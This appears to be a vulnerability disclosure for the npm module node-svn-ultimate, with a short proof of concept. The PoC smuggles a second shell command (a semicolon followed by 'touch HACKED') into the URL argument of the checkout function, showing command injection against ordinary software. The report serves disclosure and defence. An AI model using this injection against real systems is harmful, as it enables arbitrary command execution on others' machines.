# :bug: Description

The `node-svn-ultimate` module is vulnerable against `RCE` since a command is crafted using `user inputs` not validated and then executedading to `arbitrary command injection`

# :fire: POC

1. Create the following PoC file:

```js
// poc.js
var svnUltimate = require('node-svn-ultimate');
svnUltimate.commands.checkout( 'https://my.url/test; touch HACKED; #', 'test', function( err ) { console.log( "Checkout complete" ); } );
# Wait some seconds

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i node-svn-ultimate # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
